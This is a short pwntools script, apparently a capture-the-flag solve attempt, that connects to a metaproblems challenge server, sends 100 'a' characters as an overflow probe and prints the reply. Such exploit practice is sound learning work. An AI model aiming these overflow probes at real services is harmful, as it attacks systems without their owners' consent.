#!/usr/bin/python3

from pwn import *

host = "host1.metaproblems.com"
port = 5150

s = remote(host, port)

s.recv()

byt = "a" * 100
s.sendline(byt)

s.recv()
print(s.recv())


s.close()